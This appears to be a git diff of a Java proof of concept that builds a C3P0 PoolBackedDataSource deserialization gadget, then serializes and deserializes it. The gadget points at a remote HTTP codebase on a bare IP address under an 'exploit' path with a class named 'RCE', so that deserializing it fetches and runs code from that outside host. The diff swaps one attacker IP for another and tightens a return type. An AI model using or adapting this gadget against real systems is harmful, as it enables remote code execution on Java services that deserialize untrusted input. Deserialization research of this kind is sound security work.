@@ -18,12 +18,12 @@ import javax.sql.PooledConnection;
 public class C3P0 {
     public static void main(String[] args) throws Exception {
         C3P0 c3P0 = new C3P0();
-        Object object = c3P0.getObject("http://49.232.190.132/:RCE");
+        PoolBackedDataSource object = c3P0.getObject("http://114.67.236.137/exploit/:RCE");
 
         serialize(object);
         unserialize();
     }
-    public Object getObject ( String command ) throws Exception {
+    public PoolBackedDataSource getObject ( String command ) throws Exception {
         int sep = command.lastIndexOf(':');
         if ( sep < 0 ) {
             throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
